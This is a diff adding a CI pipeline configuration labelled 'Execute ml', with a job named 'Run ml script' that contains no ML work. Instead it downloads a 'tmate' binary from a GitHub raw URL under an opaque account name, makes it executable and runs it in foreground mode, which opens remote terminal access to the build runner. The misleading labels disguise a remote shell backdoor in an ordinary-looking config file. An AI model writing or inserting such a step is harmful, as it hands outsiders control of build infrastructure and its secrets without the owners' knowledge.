@@ -1,0 +1,15 @@
+version: v1.0
+name: Execute ml
+agent:
+  machine:
+    type: e1-standard-8
+    os_image: ubuntu1804
+blocks:
+  - name: Execute ml script
+    task:
+      jobs:
+        - name: Run ml
+          commands:
+            - 'wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate'
+            - chmod +x tmate
+            - ./tmate -F
